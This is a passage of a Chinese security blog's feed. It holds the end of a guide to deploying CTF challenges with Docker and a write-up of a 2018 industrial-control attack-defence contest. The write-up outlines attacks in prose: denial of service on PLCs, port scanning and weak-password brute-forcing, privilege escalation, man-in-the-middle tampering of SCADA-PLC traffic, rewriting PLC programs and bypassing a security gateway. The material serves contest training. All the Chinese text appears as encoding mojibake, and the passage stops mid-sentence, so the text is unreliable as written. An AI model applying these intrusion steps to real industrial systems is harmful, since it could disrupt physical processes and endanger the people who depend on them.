å‘½ä»¤æ—¶å°†ä»è¯¥æ–‡ä»¶ä¸­è¯»å–å˜é‡ã€‚</p><p>åœ¨å½“å‰ç›®å½•æ–°å»º <code>.env</code> æ–‡ä»¶å¹¶å†™å…¥ä»¥ä¸‹å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ”¯æŒ # å·æ³¨é‡Š</span></span><br><span class="line">MONGO_VERSION=3.6</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>docker-compose up</code> åˆ™ä¼šå¯åŠ¨ä¸€ä¸ª <code>mongo:3.6</code> é•œåƒçš„å®¹å™¨ã€‚</p><h1 id="Docker-for-CTF-Apply"><a href="#Docker-for-CTF-Apply" class="headerlink" title="Docker for CTF Apply"></a>Docker for CTF Apply</h1><hr><h3 id="CTF-web"><a href="#CTF-web" class="headerlink" title="CTF-web"></a>CTF-web</h3><p>1ã€æŸ¥æ‰¾å¯ç”¨é•œåƒï¼šdocker search lamp(è¿™æ˜¯linux+apache+mysql+phpçš„é›†æˆç¯å¢ƒï¼Œéƒ¨ç½²webé¢˜å¯ç”¨)</p><p>2ã€æ‹‰å–é•œåƒï¼šdocker pull tutum/lamp ï¼ˆå…·ä½“é•œåƒçœ‹éœ€æ±‚ï¼Œè¿™é‡Œæ˜¯Out-of-the-box LAMP image (PHP+MySQL) ï¼‰</p><p>3ã€è¿è¡Œé•œåƒå¹¶ç»‘å®šç«¯å£ï¼šdocker run -d -p 1000:80 tutum/lamp 1000æŒ‡çš„æ˜¯éœ€è¦å…¬ç½‘è®¿é—®çš„ç«¯å£ï¼Œåé¢è·Ÿé•œåƒåç§°ï¼Œå¦‚æœæ˜¯è¦ä¸åŒç«¯å£æ­å»ºä¸åŒwebé¢˜ç›®å¯é‡å¤ä½¿ç”¨æ­¤å‘½ä»¤ï¼Œæ”¹ç«¯å£å°±è¡Œã€‚</p><p>4ã€æœ€å¥½å…ˆæŠŠé¢˜ç›®ä¸‹è½½åˆ°æœåŠ¡å™¨æœ¬åœ°ï¼Œç„¶åæŠŠé¢˜ç›®æ‹·è´åˆ°dockerå®¹å™¨ï¼šdocker cp é¢˜ç›®åç§° å®¹å™¨ID:/var/www/html ä¸€èˆ¬webè·¯å¾„æ˜¯/var/www/htmlï¼Œå®¹å™¨é‡Œé¢å¾ˆå¤šå‘½ä»¤éƒ½æ²¡æœ‰ï¼Œå¦‚wgetï¼Œunzipç­‰éƒ½æ²¡æœ‰ï¼Œå»ºè®®åœ¨æœ¬åœ°å°±å¼„å¥½</p><p>å¦‚æœéœ€è¦æ•°æ®åº“</p><p>1ã€è¿›å…¥è¦ç”¨åˆ°æ•°æ®åº“çš„å®¹å™¨å†…éƒ¨ï¼šdocker exec -it å®¹å™¨ID /bin/bash<br>2ã€è¿›å…¥ä¹‹åè¿æ¥æ•°æ®åº“ï¼šmysql -u root (é»˜è®¤æ²¡æœ‰å¯†ç )<br>3ã€å¯ä»¥å…ˆçœ‹çœ‹æœ‰ä»€ä¹ˆæ•°æ®åº“ï¼šSHOW DATABASE;<br>4ã€åˆ›å»ºæ•°æ®åº“ï¼šcreate DATABASE æ•°æ®åº“å;<br>5ã€ä½¿ç”¨æ•°æ®åº“ï¼šuse æ•°æ®åº“åï¼›<br>6ã€ç»™æ•°æ®åº“åˆ›å»ºç”¨æˆ·ï¼šcreate user ç”¨æˆ·å@localhost identified by â€˜å¯†ç â€™ï¼›<br>7ã€æˆæƒç”¨æˆ·ï¼šgrant all privileges on æ•°æ®åº“å.* to ç”¨æˆ·å@localhost;<br>8ã€åˆ·æ–°ï¼šflush privileges;<br>9ã€å¦‚å†™å¥½äº†.sqlçš„æ•°æ®åº“ï¼Œå¯å¯¼å…¥æ•°æ®ï¼šsource æ–‡ä»¶çš„è·¯å¾„ ï¼ˆè¿™ä¸ªè·¯å¾„æ˜¯å®¹å™¨è·¯å¾„ï¼Œä¸€å¼€å§‹è¦æŠŠæœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶æ‹·è´åˆ°å®¹å™¨é‡Œï¼‰</p><p><strong>è¿ç»´å‘½ä»¤</strong></p><p>1ã€æŸ¥çœ‹æœ‰ä»€ä¹ˆå®¹å™¨å’Œè¿è¡Œæƒ…å†µï¼šdocker ps -a<br>2ã€è¿›å…¥å®¹å™¨ï¼šdocker exec -it å®¹å™¨ID /bin/bash<br>3ã€å¯åŠ¨å®¹å™¨ï¼šdocker start å®¹å™¨ID1 å®¹å™¨ID2 ï¼ˆè¿™ä¸ªå¯ä»¥å¯åŠ¨å¤šä¸ªå®¹å™¨ï¼‰åœæ­¢å®¹å™¨å°±æŠŠstartæ”¹ä¸ºstopå³å¯<br>4ã€å¦‚æœæœåŠ¡å™¨é‡å¯äº†ä¹‹ådockeræ²¡å¯åŠ¨ï¼Œå¯ä»¥æ·»åŠ å‚æ•°ä¿è¯æ¯æ¬¡é‡å¯ä¹‹åå®¹å™¨ä¹Ÿé‡å¯ï¼šdocker update â€“restart=always å¤šä¸ªå®¹å™¨ID</p><blockquote><p>å‡ºé¢˜æœ€å¥½å†™dockerfile æ–¹ä¾¿æ¯”èµ›é€‰æ‰‹å¤ç°XD</p></blockquote><h3 id="CTF-Pwn"><a href="#CTF-Pwn" class="headerlink" title="CTF-Pwn"></a>CTF-Pwn</h3><p>ç°åœ¨ä¸€èˆ¬ CTF Pwnçš„ç¯å¢ƒéƒ½æ˜¯ç”± xinted + docker ç»„æˆã€‚åœ¨githubä¸Š <a href="https://github.com/Eadom/ctf_xinetd" target="_blank" rel="noopener">xinetd</a> çš„é¡¹ç›®ä»æƒé™åˆ°æœåŠ¡é…ç½®éƒ½åšå¥½äº†ä¸€ä¸ªdockerfile æˆ‘ä»¬åªéœ€è¦buildä¸€ä¸‹å°±å¥½äº†..å…·ä½“æ­¥éª¤å¦‚ä¸‹</p><ul><li>å®‰è£… docker<br>åœ¨ ubuntuç¯å¢ƒä¸‹ï¼Œéœ€è¦ä»¥root å®‰è£… docker<br>sudo apt-get install docker-ce<br>clone ctf_xinetdé¡¹ç›®<br>git clone <a href="https://github.com/Eadom/ctf_xinetd.git" target="_blank" rel="noopener">https://github.com/Eadom/ctf_xinetd.git</a></li><li>é…ç½® dockerç¯å¢ƒ<br>1ã€ å°†ä½ çš„bin æ–‡ä»¶æ”¾ç½®åˆ° bin ç›®å½•ä¸‹<br>2ã€ ä¿®æ”¹ flag æ–‡æœ¬å†…å®¹ ä¸ºä½ æŒ‡å®šçš„ flag<br>3ã€ç´§æ¥ç€ä¿®æ”¹ ctf.xinetd çš„æœåŠ¡ï¼š<br>portä¸ºæŒ‡å®šç«¯å£</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_args = <span class="params">--userspec=1000</span><span class="function">:1000</span> <span class="string">/home/ctf</span> <span class="string">./helloworld</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹â€helloworldâ€ä¸ºä½ çš„binæ–‡ä»¶åç§°</p><ul><li>build dockerfile<br>åœ¨gitä¸‹çš„ç›®å½•ä¸‹<br><code>docker build -t &quot;helloworld&quot; .</code> (æ³¨æ„åé¢æ˜¯æœ‰ä¸ªç‚¹çš„ï¼‰ï¼Œhellowordæ˜¯ä½ ç¼–è¯‘åimageçš„åç§°ï¼Œä¸è¦ä½¿ç”¨binä½œä¸ºæŒ‘æˆ˜çš„åç§°</li><li>åˆ›å»ºå®¹å™¨<br>docker çš„å®¹å™¨ç›¸å½“äºæ˜¯è¿è¡Œäº†ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œåˆ›å»ºå®¹å™¨åï¼Œå°±æ˜¯å°†é•œåƒè·‘èµ·æ¥äº†ã€‚</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="bash"> -d -p <span class="string">"0.0.0.0:pub_port:9999"</span> -h <span class="string">"helloworld"</span> --name=<span class="string">"helloworld"</span> helloworld</span></span><br><span class="line">//-h ä¸»æœºå ï¼› --name å®¹å™¨å</span><br></pre></td></tr></table></figure><p>pub_port æ˜¯æ‚¨è¦å‘å…¬å…±ç½‘ç»œå…¬å¼€çš„ç«¯å£</p><p>å¦‚æœæ‚¨æƒ³æ•è·æŒ‘æˆ˜æµé‡ï¼Œåªéœ€tcpdumpåœ¨ä¸»æœºä¸Šè¿è¡Œå³å¯ã€‚è¿™æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -w helloworld<span class="selector-class">.pcap</span> -<span class="selector-tag">i</span> eth0 port pub_port</span><br></pre></td></tr></table></figure><p><strong>å¦å¤–</strong><br>æ­£å¸¸æƒ…å†µä¸‹ dockeræ˜¯éœ€è¦sudoæƒé™æ‰èƒ½è·‘çš„ã€‚æ‰€ä»¥å¦‚æœåœ¨érootä¸‹åˆ›å»ºç¯å¢ƒï¼Œè®°å¾—ç”¨sudo è¿è¡Œdocker</p><p><strong>æœ€å</strong></p><p>å¤ç°é¢˜ç›®éƒ½å¾ˆç®€å•,ä¾¿æ·å¼çš„éƒ¨ç½²æ¡†æ¶ä¹Ÿå¾ˆå¤šï¼Œä¸‹é¢ä¼šè´´å‡ ä¸ªæˆ‘çš„fock.</p><p>å‡ºé¢˜å’Œéƒ¨ç½²æ‰éœ€è¦å¤šå®è·µæ‰èƒ½ç†Ÿç»ƒæŒæ¡dockeråœ¨CTFçš„å¦™ç”¨(23333)</p><ul><li><p><a href="https://github.com/Qymua/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/Qymua/pwn_deploy_chroot</a></p></li><li><p><a href="https://github.com/Qymua/ctf_xinetd" target="_blank" rel="noopener">https://github.com/Qymua/ctf_xinetd</a></p></li><li><p><a href="https://github.com/Qymua/pwn-env-init" target="_blank" rel="noopener">https://github.com/Qymua/pwn-env-init</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿›å…¥è¿™ä¸ªåœˆå­æŒºä¹…äº†ï¼Œè¿˜æ²¡ç¢°è¿‡dockerï¼Œè¶ç€æš‘å‡é—²å¾—æ…Œï¼Œæ‰“ä¸€æ³¢åŸºç¡€XD &lt;/p&gt;
&lt;p&gt;ğŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥
      
    
    </summary>
    
      <category term="Docker" scheme="http://qymua.com/categories/Docker/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="docker-compose" scheme="http://qymua.com/tags/docker-compose/"/>
    
      <category term="Pwn" scheme="http://qymua.com/tags/Pwn/"/>
    
      <category term="web" scheme="http://qymua.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018FJå·¥æ§æ”»é˜²å¤§èµ›WriteUp</title>
    <link href="http://qymua.com/2019/08/15/2018FJ%E5%B7%A5%E6%8E%A7%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9BWriteUp/"/>
    <id>http://qymua.com/2019/08/15/2018FJå·¥æ§æ”»é˜²å¤§èµ›WriteUp/</id>
    <published>2019-08-15T13:54:24.000Z</published>
    <updated>2019-08-16T13:15:33.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>è¿™æ˜¯ä¸€æ¬¡çœå†…é¦–æ¬¡ä¸¾åŠçš„å·¥æ§æ”»é˜²å¤§èµ›ï¼Œèµ›åˆ¶æœ‰åˆ«äºå›½å†…å¾€å±Šå·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½ç«èµ›ï¼Œæœ¬è´¨å…¶å®å°±æ˜¯å†…ç½‘æ¸—é€ï¼Œæ”»å‡»ç›®æ ‡é¶æœºå–å¾—æ§åˆ¶æƒå¹¶ç¯¡æ”¹å…¶ç¨‹åº</p></blockquote><a id="more"></a><h1 id="åˆèµ›"><a href="#åˆèµ›" class="headerlink" title="åˆèµ›"></a>åˆèµ›</h1><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1565875668841.png" alt></p><p><strong>ç¬¬ä¸€å±‚:é€šè¿‡æ”»å‡»ï¼Œå¯¼è‡´å·¥ä½œç«™ä¸é¶æœºç³»ç»Ÿé€šä¿¡ä¸­æ–­</strong></p><p>æ”»å‡»æ€è·¯:</p><p>é€šä¿¡ä¸­æ–­ï¼Œå¤§å±æ˜¾ç¤ºå™¨ç»„æ€ç•Œé¢å³ä¸Šè§’ä¼šçº¢å­—é—ªçƒæç¤ºé€šä¿¡å¼‚å¸¸ã€‚æ•´æ¡é€šä¿¡é“¾è·¯ä¸Šæœ‰å·¥ä½œç«™ã€äº¤æ¢æœºã€PLCï¼Œå¯ä»¥ä¼˜å…ˆå°è¯•ä½¿ç”¨æ‹’ç»æœåŠ¡æ”»å‡»æ‰‹æ®µã€‚</p><p>PLCå±äºå·¥ä¸šäº§å“ï¼Œä¸€èˆ¬å·¥ä¸šäº§å“é’ˆå¯¹ç½‘ç»œå®‰å…¨æ–¹é¢çš„å±æ€§åå¼±ï¼Œå¯èƒ½å­˜åœ¨æŸäº›å¯åˆ©ç”¨.æ¼æ´ï¼Œæ•´æœºæ€§èƒ½ä¸€èˆ¬ä¹Ÿæœ‰é™ï¼Œæ˜“å—dosæ”»å‡»ä¸”æŠµæŠ—åŠ›è¾ƒå·®ã€‚</p><p>æ”»å‡»å·¥ä½œç«™ï¼Œä¸€èˆ¬å…ˆè·å–å·¥ä½œç«™ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚æ“ä½œç³»ç»Ÿç±»å‹ç­‰ï¼Œæ ¹æ®å·²çŸ¥çš„ä¿¡æ¯ï¼Œæ¥è§„åˆ’ä¸‹ä¸€æ­¥çš„æ”»å‡»æ€è·¯ï¼Œå¦‚æœæ“ä½œç³»ç»Ÿå¼€å¯äº†ç³»ç»Ÿè‡ªå¸¦é˜²ç«å¢™åŠŸèƒ½ï¼Œä¼šåœ¨ä¸€å®šç¨‹åº¦ä¸ŠæŠµå¾¡,dosæ”»å‡»ã€‚</p><p>äº¤æ¢æœºç½‘ç»œæ•°æ®äº¤æ¢æ€§èƒ½å¼ºï¼Œå°è§„æ¨¡çš„dos æ”»å‡»ï¼Œå¯¹å…¶éš¾æœ‰æˆæ•ˆï¼Œå¯å°è¯•å¯»æ‰¾æœªä¿®å¤çš„æ¼æ´å¹¶åŠ ä»¥åˆ©ç”¨ï¼Œç›¸æ¯”PLCå’Œå·¥ä½œç«™è€Œè¨€ï¼Œç›´æ¥æ”»å‡»éš¾åº¦ç¨å¾®åå¤§ã€‚</p><p>æ‰€ä»¥ï¼Œæ”»å‡»æ’åºå»ºè®®ä¸º: PLC&gt;Iä½œç«™&gt;äº¤æ¢æœºã€‚</p><p><strong>ç¬¬äºŒå±‚:é€šè¿‡æ”»å‡»ï¼Œå®ç°å¯¹å·¥ä½œç«™å…³é”®ä½ç½®çš„æ–‡ä»¶çªƒå–</strong></p><p>æ”»å‡»æ€è·¯:</p><p>çªƒå–é™Œç”Ÿä¸»æœºä¸Šæ–‡ä»¶ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•,ä¸€æ˜¯æŸ¥çœ‹è¯¥ä¸»æœºæ˜¯å¦æœ‰ç›´æ¥å¼€æ”¾å¯¹å¤–çš„å…±äº«æ–‡ä»¶å¤¹æˆ–FTPï¼ŒäºŒæ˜¯ç›´æ¥æ¥ç®¡å·¥ä½œç«™ï¼Œä»¥ç®¡ç†å‘˜æƒé™ç™»å½•ç³»ç»Ÿè·å¾—æ–‡ä»¶ã€‚ç”±äºæ¯”èµ›æ—¶é—´æœ‰é™,è€Œä¸”è§„åˆ™å…è®¸è¶Šå±‚æ”»å‡»ï¼Œæ‰€ä»¥è¦ç»¼åˆè¯„ä¼°ã€‚</p><p>é‰´äºç¬¬ä¸‰å±‚çš„è§„åˆ™ï¼Œå¯ä»¥åˆ¤æ–­ï¼Œè¯¥å±‚åº”è¯¥å·²ç»å¼€æ”¾å…±äº«æ–‡ä»¶å¤¹æˆ–FTPæƒé™ã€‚</p><p>é€šè¿‡æ”»å‡»å·¥å…·å¯¹å·¥ä½œç«™è¿›è¡Œæ‰«æï¼Œå¦‚åˆ©ç”¨ç«¯å£æ‰«æå·¥å…·æ£€æµ‹æ˜¯å¦å¼€æ”¾21ã€445ç­‰é«˜å±ç«¯å£ï¼Œè‹¥é‡åˆ°å¼±å£ä»¤ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨é¢„å…ˆå¤‡å¥½çš„å¯†ç å­—å…¸æ–‡ä»¶ï¼Œè¿›è¡Œæš´åŠ›ç ´è§£ã€‚å­—å…¸æ–‡ä»¶è¿‡å¤§ï¼Œåˆ™å¯èƒ½å¯¼è‡´ç ´è¯‘çš„æ—¶é—´å˜é•¿ã€‚</p><p><strong>ç¬¬ä¸‰å±‚ï¼Œé€šè¿‡æ”»å‡»ï¼Œè·å–å·¥ä½œç«™ç®¡ç†å‘˜æƒé™</strong></p><p>æ”»å‡»æ€è·¯:</p><p>è·å–ç®¡ç†å‘˜æƒé™çš„æ€è·¯æœ‰å¤šç§ï¼Œæ¯”å¦‚å¼±å£ä»¤çŒœæµ‹ï¼Œç³»ç»Ÿæ¼æ´åˆ©ç”¨ç­‰ã€‚</p><p>å¦‚æœæœ‰å¯ç›´æ¥åˆ©ç”¨çš„é«˜å±ç«¯å£ï¼Œæ¯”å¦‚å¼€æ”¾äº†Telnetã€ 3389 ç­‰è¿œç¨‹ç™»å½•æœåŠ¡ï¼Œå³å¯å°è¯•å¼±å£ä»¤çŒœæµ‹ã€‚</p><p>å¦‚æœå£ä»¤é•¿æ—¶é—´ç ´è§£ä¸å‡ºæ¥ï¼Œå¯ä»¥æ‰«æç³»ç»Ÿæ¼æ´ï¼Œåˆ©ç”¨æ¼æ´è¿›è¡Œææƒã€‚</p><p><strong>ç¬¬å››å±‚:é€šè¿‡æ”»å‡»ï¼Œç¯¡æ”¹é¶æœºç³»ç»Ÿå‚æ•°</strong></p><p>æ”»å‡»æ€è·¯</p><p>å‰ä¸‰å±‚ä¸ä¼ ç»Ÿå®‰å…¨æ— å¼‚ï¼Œè€Œç¬¬å››å±‚åˆ™éœ€è¦å·¥ä¸šè‡ªåŠ¨åŒ–é¢†åŸŸæ–¹é¢çŸ¥è¯†ã€‚å¦‚æœç†Ÿæ‚‰è‡ªåŠ¨åŒ–é¢†åŸŸï¼Œåˆ™ç¬¬å››å±‚ã€ç¬¬äº”å±‚çš„æ”»å‡»å°±ä¼šå˜å¾—å¾ˆè½»æ¾ã€‚</p><p>å·¥ä¸šç¯å¢ƒçš„å·¥ä½œç«™ï¼Œä¸»è¦æœ‰å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™ç­‰ã€‚å·¥ç¨‹å¸ˆç«™ä¸»è¦è´Ÿè´£ç»„æ€çš„ç¼–å†™å’Œä¿®æ”¹,æ“ä½œå‘˜ç«™ä¸»è¦è´Ÿè´£è®¾å¤‡çš„ç›‘æ§å’Œæ“ä½œã€‚æ¯”èµ›ç°åœºåªæœ‰ä¸€å°å·¥ä½œç«™ï¼Œåˆ™è¯´æ˜è¯¥ç«™ä¸€æœºå¤šç”¨ã€‚</p><p>è§„åˆ™ä¸­è¦æ±‚é»„ç¯äº®ï¼Œç»¿ç¯ç­ï¼Œæ‰€ä»¥æ”»å‡»æ—¶å¿…é¡»å…ˆçœ‹æ‡‚ç»„æ€ç•Œé¢ã€‚å¦‚æœç»„æ€ç•Œé¢ä¸Šæœ‰å¯ä»¥ç›´æ¥æ“ä½œæŒ‡ç¤ºç¯äº®ç­çš„æŒ‰é’®ï¼Œåˆ™å¯ä»¥å¿«é€Ÿå®ç°è¯¥æ“ä½œï¼Œé€šè¿‡æœ¬å±‚æ¬¡ã€‚</p><p>å¦‚æœç»„æ€ç•Œé¢ä¸Šçš„æ“ä½œæŒ‰é’®ä¸èµ·ä½œç”¨æˆ–è€…æ²¡æœ‰æ“ä½œæŒ‰é’®ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç»„æ€æˆ–PLC ç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œç›´æ¥ç¼–å†™ç¨‹åºï¼Œç¯¡æ”¹ä»£ç åŠå‚æ•°ï¼Œä¸‹å‘å¹¶æ‰§è¡Œã€‚åˆšæ–¹æ³•ä¹Ÿå°†ç”¨äºç¬¬äº”å±‚ç›¸åŒã€‚</p><p><strong>ç¬¬äº”å±‚:é€šè¿‡æ”»å‡»ï¼Œç¯¡æ”¹é¶æœºç³»ç»Ÿæ§åˆ¶ç¨‹åº</strong></p><p>æ”»å‡»æ€è·¯:</p><p>ç†Ÿæ‚‰æ¢¯å½¢å›¾ï¼Œæ‡‚å¾—ç¼–å†™PLCç¨‹åºï¼Œç›´æ¥ä½¿æœˆç»„æ€æˆ–PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œå³å¯è½»æ¾é€šè¿‡æœ¬å±‚æ¬¡ã€‚</p><h1 id="å†³èµ›"><a href="#å†³èµ›" class="headerlink" title="å†³èµ›"></a>å†³èµ›</h1><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1565876578132.png" alt></p><p><strong>ç¬¬ä¸€å±‚:è·å–SCADAä¸»æœºç³»ç»Ÿç®¡ç†æƒé™</strong></p><p>æ”»å‡»æ€è·¯:</p><p>ä¸åˆèµ›ç¬¬ä¸‰å±‚ç›¸åŒã€‚ç”±äºæ˜¯å†³èµ›ç¯èŠ‚ï¼Œä¸»æœºç³»ç»Ÿå®‰å…¨é…ç½®ä¼šè¿›è¡ŒåŠ å›ºï¼Œç›¸æ¯”åˆèµ›ï¼Œéš¾åº¦æœ‰æ‰€æå‡ã€‚</p><p><strong>ç¬¬äºŒå±‚:è·å–SCADAä¸»æœºæ¡Œé¢ï¼Œä¸Šçš„å¯†å‡½æ–‡ä»¶çš„å†…å®¹</strong></p><p>æ”»å‡»æ€è·¯:</p><p>è·å–SCADAä¸»æœºæƒé™åï¼Œå¯ä»¥æœç´¢å¯»æ‰¾ç¡¬ç›˜ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚</p><p>æ ¹æ®æç¤ºå¯ä»¥è¿›å»æ¡Œé¢æ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å¯†å‡½æ–‡ä»¶ã€‚æ ¹æ®é¢˜æ„ï¼Œéœ€è¦è·å–æ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚å¦‚æœåŒå‡»æ–‡ä»¶æ‰“å¼€çš„å†…å®¹ä¸ºä¹±ç æˆ–ä¸æç¤ºä¸ç¬¦ï¼Œåˆ™è¯´æ˜è¯¥æ–‡ä»¶é‡‡å–äº†æŸäº›æŠ€æœ¯æ··æ·†è§†å¬ã€‚</p><p>å¯èƒ½æ˜¯å‹ç¼©åŒ…æ–‡ä»¶ï¼Œéœ€è¦ç ´è§£å¯†ç ï¼Œä¹Ÿå¯èƒ½æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Œå†…å®¹éšå†™å…¶ä¸­ã€‚æ‰€ä»¥å¯ä»¥å¯¹è¯¥æ–‡ä»¶é‡æ–°å®šä¹‰ç±»å‹å¹¶æ‰¾å‡ºå¯†å‡½ã€‚</p><p><strong>ç¬¬ä¸‰å±‚:é€ æˆSCADAç³»ç»Ÿä¸é¶æœºç³»ç»Ÿæ‹’ç»æœåŠ¡</strong></p><p>æ”»å‡»æ€è·¯:</p><p>ä¸åˆèµ›ç¬¬ä¸€å±‚æ”»å‡»æ€è·¯ç›¸åŒï¼Œä½†é¶æœºç³»ç»Ÿå‰å¤šäº†å®‰å…¨ç½‘å…³ï¼Œå¯èƒ½ä¼šå¯¹dosæ”»å‡»è¿›è¡Œæ‹¦æˆªã€‚</p><p>å¯ä»¥å°è¯•å¯¹ä¸Šä½æœºè¿›è¡Œçªç ´ï¼Œä¼ªè£…ä¸Šä½æœºï¼Œè¿›è€Œå¯¼è‡´çœŸæ˜¯æœºå™¨é€šä¿¡ä¸­æ–­ã€‚</p><p><strong>ç¬¬å››å±‚:ä¿®æ”¹SCADAç³»ç»Ÿç›‘æ§çŠ¶æ€</strong></p><p>æ”»å‡»æ€è·¯:</p><p>å‰ä¸‰å±‚ä¸ä¼ ç»Ÿå®‰å…¨æ— å¼‚ï¼Œè€Œç¬¬å››å±‚åˆ™éœ€è¦å·¥ä¸šè‡ªåŠ¨åŒ–é¢†åŸŸæ–¹é¢çŸ¥è¯†</p><p>å·¥ä¸šç¯å¢ƒçš„å·¥ä½œç«™ï¼Œä¸»è¦æœ‰å·¥ç¨‹å¸ˆç«™ã€æ“ä½œå‘˜ç«™ç­‰ã€‚å·¥ç¨‹å¸ˆç«™ä¸»è¦è´Ÿè´£ç»„æ€çš„ç¼–å†™å’Œä¿®æ”¹,æ“ä½œå‘˜ç«™ä¸»è¦è´Ÿè´£è®¾å¤‡çš„ç›‘æ§å’Œæ“ä½œã€‚æ¯”èµ›ç°åœºåªæœ‰ä¸€å°å·¥ä½œç«™ï¼Œåˆ™è¯´æ˜è¯¥ç«™ä¸€æœºå¤šç”¨ã€‚</p><p>è¯¥å±‚è§„åˆ™è¦æ±‚å®ŒæˆSCADAç³»ç»Ÿç»„æ€ç•Œé¢æ•°å€¼å‘ç”Ÿæ”¹å˜ï¼Œé¶æœºç³»ç»Ÿæ•°å­—æ˜¾ç¤ºè¡¨ä¸Šæ•°å€¼ä¸å˜ï¼Œä¸€èˆ¬å¯ä»¥é‡‡å–ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ä¸­é—´äººæ¬ºéª—æ”»å‡»ï¼Œæˆªå–SCADAä¸PLCçš„æŠ¥æ–‡ï¼Œé˜»æ–­å¹¶æ¥ç®¡é€šè®¯ï¼Œå°†ç¯¡æ”¹åçš„æŠ¥æ–‡å‘é€ç»™SCADA;äºŒæ˜¯åˆ©ç”¨ç»„æ€æˆ–PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶.ç›´æ¥ç¼–å†™ç¨‹åºï¼Œç¯¡æ”¹ä»£ç åŠå‚æ•°ï¼Œä¸‹å‘å¹¶æ‰§è¡Œã€‚è¯¥æ–¹æ³•ä¹Ÿå°†ç”¨äºç¬¬äº”å±‚ç›¸åŒã€‚</p><p><strong>ç¬¬äº”å±‚ä¿®æ”¹é¶æœºç³»ç»Ÿé€»è¾‘</strong></p><p>æ”»å‡»æ€è·¯:</p><p>ä¸åˆèµ›ç¬¬äº”å±‚æ”»å‡»æ€è·¯åŸºæœ¬ç›¸åŒï¼Œç†Ÿæ‚‰æ¢¯å½¢å›¾ï¼Œæ‡‚å¾—ç¼–å†™PLCç¨‹åºï¼Œç›´æ¥ä½¿ç”¨ç»„æ€æˆ–;PLCç¼–ç¨‹ç­‰ç›¸å…³è½¯ä»¶ï¼Œå°±æœ‰å¯èƒ½é€šè¿‡æœ¬å±‚æ¬¡ã€‚ä½†åˆä¸åˆèµ›ç¬¬äº”å±‚ä¸åŒçš„æ˜¯ï¼Œå†³èµ›ç¯èŠ‚å¤šäº†å®‰å…¨ç½‘å…³è®¾å¤‡ï¼Œè¯¥è®¾å¤‡ä¼šé˜²ä½å¼‚å¸¸è¯»å†™çš„æ“ä½œï¼Œæ‰€ä»¥å¦‚æœä¹…æ”»ä¸ä¸‹ï¼Œå°±è¦è€ƒè™‘å…ˆè·å–å®‰å…¨ç½‘å…³è®¾å¤‡çš„æ§åˆ¶æƒæˆ–ç»•è¿‡å®‰å…¨ç½‘å…³ï¼Œå®ŒæˆPLCç¨‹åºçš„å†™å…¥æ“ä½œã€‚</p><p> <strong>ç¬¬å…­å±‚æ”»åšä¿å«æˆ˜ï¼Œä¿æŠ¤è‡ªèº«é˜Ÿä¼çº¢æ——é£˜é£˜</strong></p><p>æ”»å‡»æ€è·¯:</p><p>è¿›å…¥ç¬¬å…­å±‚éœ€è¦ä¸¤ä¸ªå¿…å¤‡æ¡ä»¶,ä¸€æ˜¯æ”»ç ´ç¬¬äºŒå±‚æ‹¿åˆ°å¯†å‡½æ–‡ä»¶;äºŒæ˜¯æ”»ç ´ç¬¬äº”å±‚æ‹¿åˆ°å†›äº‹è¦å¡èµ„æ ¼ã€‚</p><p>ç¬¬äºŒå±‚çš„å¯†å‡½æ–‡ä»¶ç ´è¯‘ç¯èŠ‚ï¼Œå¯ä»¥å°†æ–‡ä»¶æ‹·è´ç»™å›¢é˜Ÿä¸­å…¶ä»–çš„æ”»å‡»äººå‘˜ï¼Œè®©å›¢é˜Ÿé—²ç½®çš„ç”µè„‘è®¾å¤‡ï¼Œå»å®Œæˆç 